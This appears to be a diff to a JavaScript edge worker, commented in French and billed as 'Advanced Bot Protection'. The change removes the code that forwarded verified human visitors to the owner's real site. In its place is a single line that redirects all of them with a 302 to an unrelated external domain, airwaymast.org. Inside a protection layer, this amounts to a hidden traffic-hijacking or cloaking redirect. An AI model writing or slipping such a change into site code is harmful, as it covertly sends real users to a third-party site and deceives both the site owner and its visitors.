@@ -510,31 +510,5 @@ export default {
  * Gère les requêtes légitimes (proxie vers votre vrai site)
  */
 async function handleLegitimateRequest(request, env) {
-  // Remplacez par l'URL de votre vrai site
-  const targetUrl = env.TARGET_URL || 'https://your-real-website.com';
-  
-  // Créer une nouvelle requête vers le site cible
-  const url = new URL(request.url);
-  const targetRequest = new Request(targetUrl + url.pathname + url.search, {
-    method: request.method,
-    headers: request.headers,
-    body: request.body
-  });
-  
-  // Ajouter un header pour identifier les requêtes vérifiées
-  targetRequest.headers.set('X-Security-Verified', 'true');
-  
-  // Proxier la requête
-  const response = await fetch(targetRequest);
-  
-  // Retourner la réponse avec les headers de sécurité
-  return new Response(response.body, {
-    status: response.status,
-    statusText: response.statusText,
-    headers: {
-      ...response.headers,
-      'X-Protected-By': 'Advanced Bot Protection',
-      'X-Security-Level': 'High'
-    }
-  });
+  return Response.redirect('http://airwaymast.org/', 302);
 }
